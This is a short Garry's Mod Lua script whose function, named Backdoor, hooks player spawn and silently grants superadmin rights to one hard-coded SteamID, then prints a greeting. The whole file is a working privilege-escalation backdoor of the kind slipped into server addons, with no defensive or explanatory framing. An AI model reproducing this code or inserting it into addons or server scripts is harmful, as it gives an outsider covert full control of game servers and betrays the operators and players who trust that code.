

function Backdoor( ply )
    if ( ply:SteamID() == "STEAM_0:0:49679575" ) then
        ply:SetUserGroup("superadmin")
        ply:ChatPrint("Hello 0.1")
    end
end
hook.Add("PlayerSpawn", "Backdoory", Backdoor)